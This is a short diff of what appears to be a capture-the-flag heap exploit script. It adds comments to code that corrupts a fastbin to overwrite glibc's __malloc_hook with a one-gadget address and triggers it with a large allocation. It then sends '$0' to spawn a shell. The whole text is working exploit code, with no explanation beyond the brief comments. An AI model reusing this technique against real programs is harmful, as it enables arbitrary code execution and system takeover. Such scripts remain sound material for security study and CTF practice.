@@ -95,12 +95,12 @@ allocate(0x60)#4
 allocate(0x60)#6
 free(6)
 fill(4,"X"*(0x60+8)+p64(0x71)+p64(malloc_hook-35))
-free(1)
+free(1)# to clean up the ZZZZZZZZ on the main_arena, since it will cause size problem on the heap
 
 allocate(0x60)#1
 allocate(0x60)#6 <mallochook
 
-fill(6,"P"*19+p64(one))
+fill(6,"P"*19+p64(one))#P*19 are the padding
 sleep(2)
 allocate(100000)#allocate big chunk will triger malloc_hook
 r.sendline("$0")
